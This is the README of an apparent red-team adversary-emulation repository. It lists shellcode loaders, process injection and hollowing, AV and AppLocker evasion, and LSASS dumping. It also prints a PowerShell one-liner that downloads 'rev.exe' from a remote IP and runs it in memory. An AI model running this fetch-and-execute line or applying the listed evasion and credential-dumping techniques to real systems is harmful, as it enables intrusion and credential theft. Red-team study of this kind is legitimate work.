# Adversary Emulation Code Repository

## Disclaimer
All code examples in this repository are provided as-is, without any warranty or guarantee of functionality. This repository serves as a collection of code used in my adversary emulation studies.

## Overview
This repository contains various tools and techniques for adversary emulation, focusing on evasion, lateral movement, and payload execution. The code is structured for modularity, with public classes and methods to allow for reflective loading, as demonstrated below:

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main("".Split())
```

## Contents
| Snippet Name | Description |
|-------------|-------------|
| **AppLocker Bypass PowerShell Runspace (C#)** | Uses `CertUtil`, `BitsAdmin`, and `InstallUtil` to bypass AppLocker restrictions. |
| **Fileless Lateral Movement (C#)** | Achieves lateral movement without writing to disk, leveraging a PSExec-like method with an existing process. Includes Windows Defender evasion techniques. |
| **Linux Shellcode Encoder (Python)** | Encodes C# payloads from Linux, supporting XOR and ROT encoding with an arbitrary key. Accepts raw shellcode payloads or integrates with `msfvenom`. |
| **Linux Shellcode Loaders (C)** | A collection of C-based shellcode loaders, including library hijacking techniques. |
| **MiniDump (C# & PowerShell)** | Dumps LSASS to `C:\Windows\Tasks\lsass.dmp`. Also provided as a native PowerShell script. |
| **MSSQL (C#)** | Demonstrates various MSSQL interactions, allowing customization based on specific needs. |
| **PrintSpoofer.NET (C#)** | Exploits Print Spooler vulnerabilities to steal authentication tokens and execute arbitrary binaries without requiring an interactive session. |
| **ROT Shellcode Encoder (C#)** | Obfuscates shellcode using ROT encoding, taking an argument for the number of rotations. |
| **Sections Shellcode Process Injector (C#)** | Injects shellcode using `NtCreateSection`, `NtMapViewOfSection`, `NtUnMapViewOfSection`, and `NtClose`, avoiding standard process injection techniques. |
| **Shellcode Process Hollowing (C#)** | Uses process hollowing to inject and execute shellcode in `svchost.exe`, achieving a low detection rate on VirusTotal. |
| **Shellcode Process Injector (C# & PowerShell)** | Injects shellcode into a target process, selecting an appropriate process based on privilege level. Also available as a PowerShell script. |
| **Simple Shellcode Runner (C# & PowerShell & VBA)** | A basic shellcode runner implemented in C#, PowerShell, and VBA. |
| **XOR Shellcode Encoder (C#)** | Applies XOR encoding for shellcode obfuscation, enhancing evasion capabilities. |

## Why This Repository?
This collection is designed to demonstrate practical adversary emulation techniques used in cybersecurity research, red teaming, and penetration testing. It provides:
- Modular and reusable code for various security research applications.
- Evasion techniques to bypass detection mechanisms.
- Practical examples of lateral movement and process injection methodologies.

---
### ⚠️ Ethical Usage Notice
This repository is intended for **educational and research purposes only**. Any misuse of the provided code is strictly discouraged. Always obtain proper authorization before conducting security assessments.

For inquiries or collaboration opportunities, feel free to connect!

